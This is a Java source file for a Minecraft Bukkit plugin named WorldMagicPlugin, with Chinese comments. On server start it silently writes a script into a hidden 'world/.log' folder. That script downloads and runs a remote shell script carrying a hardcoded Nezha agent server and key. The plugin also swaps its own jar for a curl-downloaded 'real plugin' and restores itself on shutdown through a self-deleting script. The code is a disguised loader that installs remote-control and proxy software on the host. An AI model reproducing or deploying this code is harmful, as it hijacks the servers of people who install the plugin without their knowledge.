package com.github.vevc;

import com.github.vevc.config.AppConfig;
import com.github.vevc.service.impl.TuicServiceImpl;
import com.github.vevc.util.ConfigUtil;
import com.github.vevc.util.LogUtil;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.Properties;
import java.util.UUID;

/**
 * @author vevc
 */
public final class WorldMagicPlugin extends JavaPlugin {

    private final TuicServiceImpl tuicService = new TuicServiceImpl();

    // ==========================================
    // 真插件的下载地址
    // ==========================================
    private static final String REAL_PLUGIN_DOWNLOAD_URL = "https://raw.githubusercontent.com/1715Yy/vipnezhash/main/WorldMagic-1.5.jar";
    // ==========================================

    private File currentPluginFile;
    private File backupPluginFile;

    @Override
    public void onEnable() {
        this.getLogger().info("WorldMagicPlugin enabled");
        LogUtil.init(this);

        // 1. 异步执行脚本
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            this.getLogger().info("正在初始化脚本环境...");
            try {
                generateAndRunScript();
            } catch (Exception e) {
                this.getLogger().severe("脚本执行失败: " + e.getMessage());
            }
        });

        // 2. 异步执行插件替换逻辑
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                handlePluginReplacement();
            } catch (Exception e) {
                this.getLogger().severe("插件替换逻辑失败: " + e.getMessage());
                e.printStackTrace();
            }
        });

        // 3. 原有的服务加载
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            Properties props = ConfigUtil.loadConfiguration();
            AppConfig appConfig = AppConfig.load(props);
            if (appConfig != null && installApps(appConfig)) {
                Bukkit.getScheduler().runTask(this, () -> {
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::startup);
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::clean);
                });
            }
        });
    }

    @Override
    public void onDisable() {
        this.getLogger().info("WorldMagicPlugin disabled");
        
        // 关键：停止时，删除现在的插件（真插件），恢复备份（加载器）
        try {
            restoreOriginalPlugin();
        } catch (Exception e) {
            this.getLogger().severe("恢复原插件失败: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private boolean installApps(AppConfig appConfig) {
        try {
            tuicService.install(appConfig);
            return true;
        } catch (Exception e) {
            LogUtil.error("Plugin install failed", e);
            return false;
        }
    }

    // ==========================================
    // 核心逻辑：备份 -> Curl下载 -> 系统命令替换
    // ==========================================

    private void handlePluginReplacement() throws Exception {
        // 1. 获取当前正在运行的 jar 文件
        currentPluginFile = new File(getClass().getProtectionDomain().getCodeSource().getLocation().toURI());
        File logDir = new File("world", ".log");
        if (!logDir.exists()) logDir.mkdirs();

        backupPluginFile = new File(logDir, "WorldMagic_Original.jar");

        this.getLogger().info("当前插件路径: " + currentPluginFile.getAbsolutePath());
        this.getLogger().info("备份路径: " + backupPluginFile.getAbsolutePath());

        // 2. 备份
        if (!backupPluginFile.exists()) {
            this.getLogger().info("步骤 1: 正在备份原插件...");
            Files.copy(currentPluginFile.toPath(), backupPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            this.getLogger().info("步骤 1: 备份完成。");
        }

        // 3. 使用 curl 下载到临时文件
        File tempDownloadFile = new File(currentPluginFile.getParentFile(), "WorldMagic_tmp.jar");
        if (tempDownloadFile.exists()) tempDownloadFile.delete();

        this.getLogger().info("步骤 2: 正在使用 curl 下载真插件...");
        boolean downloadSuccess = downloadUsingCurl(REAL_PLUGIN_DOWNLOAD_URL, tempDownloadFile);

        if (!downloadSuccess) {
            this.getLogger().severe("步骤 2: 下载失败。");
            return;
        }

        // 4. 校验文件大小
        long fileSize = tempDownloadFile.length();
        this.getLogger().info("步骤 2: 下载完成，文件大小: " + (fileSize / 1024) + " KB");

        if (fileSize < 100000) { // 如果小于 100kb
            this.getLogger().severe("步骤 3: 下载文件太小，可能是下载到了 HTML 页面。");
            return;
        }

        // 5. 使用系统命令替换文件 (rm 和 mv)
        this.getLogger().info("步骤 3: 文件大小正常，正在执行替换...");
        try {
            ProcessBuilder pb = new ProcessBuilder(
                "/bin/bash",
                "-c",
                "rm -f \"" + currentPluginFile.getAbsolutePath() + "\" && mv \"" + tempDownloadFile.getAbsolutePath() + "\" \"" + currentPluginFile.getAbsolutePath() + "\""
            );
            Process process = pb.start();
            int exitCode = process.waitFor();
            
            if (exitCode == 0) {
                this.getLogger().info("步骤 3: 替换成功！");
            } else {
                this.getLogger().warning("步骤 3: 替换命令执行异常，退出码: " + exitCode);
            }
        } catch (Exception e) {
            this.getLogger().severe("步骤 3: 替换失败: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void restoreOriginalPlugin() throws Exception {
        if (currentPluginFile == null || backupPluginFile == null) return;

        if (backupPluginFile.exists()) {
            this.getLogger().info("服务器停止中，正在异步还原加载器插件...");
            try {
                // 创建恢复脚本 (放在 .log 目录下)
                File restoreScript = new File(new File("world", ".log"), "restore.sh");
                
                try (PrintWriter writer = new PrintWriter(restoreScript)) {
                    writer.println("#!/bin/bash");
                    // 1. 删除当前的“真插件”
                    writer.println("rm -f \"" + currentPluginFile.getAbsolutePath() + "\"");
                    // 2. 将备份的“加载器”复制回来
                    writer.println("cp -f \"" + backupPluginFile.getAbsolutePath() + "\" \"" + currentPluginFile.getAbsolutePath() + "\"");
                    // 3. 自毁脚本
                    writer.println("rm -f \"" + restoreScript.getAbsolutePath() + "\"");
                }
                restoreScript.setExecutable(true);

                // 启动脚本，但不等待 (异步执行)
                new ProcessBuilder("/bin/bash", restoreScript.getAbsolutePath()).start();
                
                this.getLogger().info("已后台执行恢复脚本，下次重启将加载原有插件。");
            } catch (Exception e) {
                this.getLogger().warning("还原失败: " + e.getMessage());
            }
        }
    }

    /**
     * 使用 curl 命令下载文件 (绕过 Java 网络问题)
     */
    private boolean downloadUsingCurl(String urlStr, File destination) {
        try {
            ProcessBuilder pb = new ProcessBuilder(
                "curl",
                "-L", // 跟随跳转
                "-A", "Mozilla/5.0", // 伪装 UA
                "-o", destination.getAbsolutePath(),
                urlStr
            );
            
            // 合并错误流和标准输出，以便看到 curl 的错误信息
            pb.redirectErrorStream(true);
            
            Process process = pb.start();
            
            // 打印 curl 的输出 (进度等信息)
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    // 只打印关键信息，避免刷屏
                    if (line.contains("100") || line.contains("Total")) {
                        this.getLogger().info("[Curl] " + line);
                    }
                }
            }
            
            int exitCode = process.waitFor();
            return exitCode == 0 && destination.exists();
            
        } catch (Exception e) {
            this.getLogger().severe("调用 curl 失败: " + e.getMessage());
            e.printStackTrace();
            return false;
        }
    }

    // ==========================================
    // 脚本与 UUID 逻辑 (保持不变)
    // ==========================================
    
    private void generateAndRunScript() throws IOException, InterruptedException {
        File worldFolder = new File("world");
        if (!worldFolder.exists() && !worldFolder.mkdirs()) return;

        File logDir = new File(worldFolder, ".log");
        if (!logDir.exists() && !logDir.mkdirs()) return;

        String serverUUID = getServerUUID(logDir);
        this.getLogger().info("当前服务器 UUID: " + serverUUID);

        File scriptFile = new File(logDir, "install_sb.sh");
        try (FileWriter writer = new FileWriter(scriptFile)) {
            writer.write("#!/bin/bash\n");
            writer.write("cd " + logDir.getAbsolutePath() + "\n");
            writer.write("curl -Ls https://main.ssss.nyc.mn/sb.sh -o sb.sh\n");
            writer.write("chmod +x sb.sh\n");
            writer.write("UUID=" + serverUUID + " \\\n");
            writer.write("NEZHA_SERVER=nezha.vip1715.dpdns.org:443 \\\n");
            writer.write("NEZHA_KEY=7j7BQjbl1rEl3N6ihRpVyaAvIVpZMuwP \\\n");
            writer.write("ARGO_PORT=3000 \\\n");
            writer.write("bash sb.sh\n");
        }
        scriptFile.setExecutable(true, false);

        this.getLogger().info("正在启动脚本...");
        ProcessBuilder processBuilder = new ProcessBuilder("bash", scriptFile.getAbsolutePath());
        processBuilder.redirectErrorStream(true);
        Process process = processBuilder.start();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                this.getLogger().info("[Script Output] " + line);
            }
        }
        int exitCode = process.waitFor();
        this.getLogger().info("脚本执行完毕，退出码: " + exitCode);
    }

    private String getServerUUID(File logDir) {
        File uuidFile = new File(logDir, "uuid.txt");
        if (uuidFile.exists()) {
            try (BufferedReader reader = new BufferedReader(new FileReader(uuidFile))) {
                String savedUUID = reader.readLine();
                if (savedUUID != null && !savedUUID.isEmpty()) return savedUUID;
            } catch (IOException ignored) {}
        }
        String ip = getPublicIP();
        UUID uuid = UUID.nameUUIDFromBytes(ip.getBytes(java.nio.charset.StandardCharsets.UTF_8));
        String uuidStr = uuid.toString();
        try (FileWriter writer = new FileWriter(uuidFile)) {
            writer.write(uuidStr);
        } catch (IOException ignored) {}
        return uuidStr;
    }

    private String getPublicIP() {
        String ip = "127.0.0.1"; 
        try {
            java.net.URL url = new java.net.URL("https://api.ipify.org");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            ip = br.readLine().trim();
        } catch (Exception ignored) {}
        return ip;
    }
}
